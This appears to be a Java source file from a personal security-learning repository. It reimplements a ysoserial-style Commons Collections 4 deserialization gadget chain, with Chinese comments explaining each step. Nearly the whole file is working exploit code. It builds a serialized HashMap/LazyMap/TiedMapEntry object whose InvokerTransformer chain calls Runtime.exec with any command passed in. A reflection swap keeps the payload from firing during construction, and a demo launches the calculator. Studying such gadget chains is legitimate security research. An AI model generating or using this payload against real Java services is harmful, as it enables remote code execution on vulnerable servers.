package com.xjjlearning.hack.java.ysoserial.payloads;

import com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;
import java.util.Optional;

/**
 * created by xjj on 2023/2/8
 */

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
 */
public class CommonsCollections4 {
    // jdk8u71以及之后的版本使用
    public byte[] getPayload(String exp) throws Exception {
        // 假的transformerChain, 后来用反射替换成真的, 原因在于防止本地调试触发计算器
        final ChainedTransformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(2)});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{exp}
                ),
                new ConstantTransformer(1) // 隐藏告警日志
        };

        // HashMap.readObject() -> HashMap.hash(key) -> TiedMapEntry.hashCode() -> LazyMap.get()
        Map outerMap = LazyMap.lazyMap(new HashMap(), transformerChain);

        HashMap obj = new HashMap();
        // 这个put也执行了一遍TiedMapEntry.hashCode()方法, 导致先执行了一遍LazyMap.get(), (如果不用假的chain先放入其中的话会在本地弹出计算器, 但是并没有构造好利用链)
        // 这个将我们的key以及经过factory.transform(key)的value放入LazyMap, 所以需要我们再手动删掉这个key
        obj.put(new TiedMapEntry(outerMap, "key"), "");
        // 如果不删除这个key 在反序列化的时候就无法执行transform方法啦
        outerMap.remove("key");

        // 变量替换 防止上边obj.put()方法弹出计算器
        // 使用 ChainedTransformer 就需要修改这个变量
        ReflectionUtil.setFieldValue(transformerChain, "iTransformers", transformers);

        Optional<byte[]> b = SerializationUtil.serialize(obj);
        return b.get();
    }

    private void gadget() throws Exception {
        String exp = "open -a Calculator";
        byte[] payload = getPayload(exp);
        SerializationUtil.deserialize(payload);
    }

    public static void main(String[] args) throws Exception {
        new CommonsCollections4().gadget();
    }
}
